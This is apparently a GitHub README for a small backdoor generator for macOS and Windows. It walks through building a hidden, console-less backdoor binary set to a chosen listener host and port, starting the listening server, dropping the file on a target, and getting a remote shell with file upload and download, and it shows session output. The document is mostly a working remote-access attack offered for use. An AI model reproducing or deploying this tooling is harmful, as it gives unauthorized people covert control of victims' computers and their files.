# Tiny-Backdoor-Generator

Tiny Backdoor-Generator suitable for Macos/Windows 

---

## Author

[![Linkedin: Thierry Khamphousone](https://img.shields.io/badge/-Thierry_Khamphousone-blue?style=flat-square&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/tkhamphousone/)](https://www.linkedin.com/in/tkhamphousone)

---

<br/>

## Setup

```sh
$ git clone https://github.com/Yulypso/Backdoor-Generator.git
$ cd Backdoor-Generator/src
```

## Commands

```sh
=== Tiny Backdoor Commands ===
clear: Clear the terminal
cd <dir>: Change directory
download <file>: Download a file from remote host
upload <file>: Upload a file to remote host
exit: Close the active session
````

## Use case

1. Generate a backdoor for LHOST=172.16.198.128 and LPORT=7777 

- MacOS
```sh
$ ./generate_backdoor 172.16.198.128 7777
[+] Backdoor generated: ../out/2022-11-22_20:40:23_backdoor
```

- Windows
```bat
:: Replace ${LHOST} ${LPORT} and run the following command: 
python -m PyInstaller backdoor_template.py --onefile --noconsole --name "backdoor"
```


2. Start server 

```sh
$ python3 server.py --lhost 172.16.198.128 --lport 7777
[+] Running server 172.16.198.128:7777
[+] Listening for the incoming connections ...
```

3. Drop the backdoor file and run it from the target


4. Get the shell
```sh
[+] Target connected from: ('172.16.198.1', 58859)
[help] Type exit command to quit

> Shell~('172.16.198.1', 59902): uname -a
Darwin Yulypso.lan 22.1.0 Darwin Kernel Version 22.1.0: Sun Oct  9 20:14:54 PDT 2022; root:xnu-8792.41.9~2/RELEASE_X86_64 x86_64

> Shell~('172.16.198.1', 59902): whoami
yulypso

> Shell~('172.16.198.1', 59902): exit
```